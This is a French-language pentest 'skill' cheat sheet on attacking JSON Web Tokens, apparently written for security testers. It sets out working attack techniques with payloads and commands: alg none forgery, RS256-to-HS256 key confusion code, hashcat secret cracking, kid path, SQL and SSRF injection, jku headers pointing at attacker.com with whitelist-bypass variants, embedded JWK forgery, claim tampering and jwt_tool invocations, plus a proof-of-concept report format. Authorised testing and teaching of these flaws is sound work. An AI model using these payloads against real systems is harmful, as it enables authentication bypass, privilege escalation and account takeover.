# Skill — JWT Attacks

Attaques courantes sur JSON Web Tokens.

## 1. Décoder un JWT

Un JWT = `header.payload.signature` en base64url.

```bash
echo "<jwt>" | cut -d. -f1 | base64 -d 2>/dev/null
echo "<jwt>" | cut -d. -f2 | base64 -d 2>/dev/null
```

Ou `jwt_tool.py` / `pyjwt` / https://jwt.io (**⚠ jamais coller un JWT de prod sur un site tiers**).

## 2. Check-list de tests

### 2.1 Algorithme `none`

Change `"alg":"HS256"` → `"alg":"none"` et supprime la signature :

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.<payload>.
```

Si accepté → forge total (admin, autre user, etc.).

### 2.2 Algorithm confusion (RS256 → HS256)

Si le serveur utilise RS256, récupère la clé publique (souvent `/.well-known/jwks.json` ou exposée en PEM dans le repo). Signe un JWT en HS256 avec la **clé publique comme secret** : le serveur va valider avec la même clé.

```python
import jwt
pub = open("public.pem").read()
token = jwt.encode({"user":"admin"}, pub, algorithm="HS256")
```

### 2.3 Weak HS256 secret

Brute-force le secret avec `hashcat` :

```bash
hashcat -a 0 -m 16500 jwt.txt wordlist.txt
```

Wordlists utiles : `rockyou`, `secrets-top-10k`, `jwt.secrets.list` (assetnote).

### 2.4 `kid` injection

`kid` (Key ID) dans le header peut être une path/SQL/command injection :

```
"kid": "../../../../dev/null"       → secret = "" (empty file)
"kid": "key' UNION SELECT 'secret'--" → SQLi si lookup en base
"kid": "http://evil.com/key"        → SSRF si fetched
```

### 2.5 `jku` / `x5u` injection

`jku` pointe vers un JWKS ; si le serveur le trust :

```
"jku": "https://attacker.com/jwks.json"
```

Serve ta propre clé publique → le serveur valide ton token forgé.

Bypass whitelist courante :
- `"jku": "https://trusted.com@attacker.com/jwks.json"`
- `"jku": "https://trusted.com.attacker.com/jwks.json"`

### 2.6 Embedded JWK (`jwk` dans le header)

Certains parsers acceptent une clé publique **dans le token lui-même** :

```json
{
  "alg": "RS256",
  "jwk": {"kty":"RSA","n":"<mes-modulus>","e":"AQAB"}
}
```

Signe avec ta clé privée → le serveur valide avec ta clé publique embarquée.

## 3. Claims à attaquer

- `iat`, `exp`, `nbf` : expire-t-il ? Peut-on forcer l'expiration à très long terme ?
- `sub`, `user_id`, `uid` : change pour un autre user → IDOR via JWT
- `role`, `admin`, `is_admin`, `scope`, `permissions` : escalate
- `iss`, `aud` : vérifiés côté serveur ? Si non, token d'un autre service peut être accepté
- `jti` : rejoué possible ?

## 4. Outil tout-en-un

```bash
# jwt_tool.py par ticarpi
python3 jwt_tool.py <token> -T          # tamper interactively
python3 jwt_tool.py <token> -X a        # alg=none
python3 jwt_tool.py <token> -X k -pk public.pem  # algo confusion
python3 jwt_tool.py <token> -C -d wordlist.txt   # crack HS256
```

## 5. Impact

| Scénario | Sévérité |
|----------|----------|
| `alg:none` accepté | Critical (full auth bypass) |
| Weak secret crackable | Critical |
| Algo confusion RS→HS | Critical |
| `jku`/`jwk` injection | Critical |
| `kid` injection à RCE | Critical |
| `kid` injection à auth bypass | High |
| Claim non-vérifié (role escalation) | High/Critical |

## 6. PoC — format

```http
GET /api/admin/users HTTP/1.1
Host: target.com
Authorization: Bearer <forged-jwt>
```

Response prouvant l'escalation :
```json
{"users":[{"email":"...","role":"admin"}, ...]}
```

Inclure dans le rapport :
- Le JWT original (decoded)
- Le JWT forgé (decoded)
- La technique utilisée (`alg:none`, algo confusion, etc.)
- Le script Python minimal pour régénérer
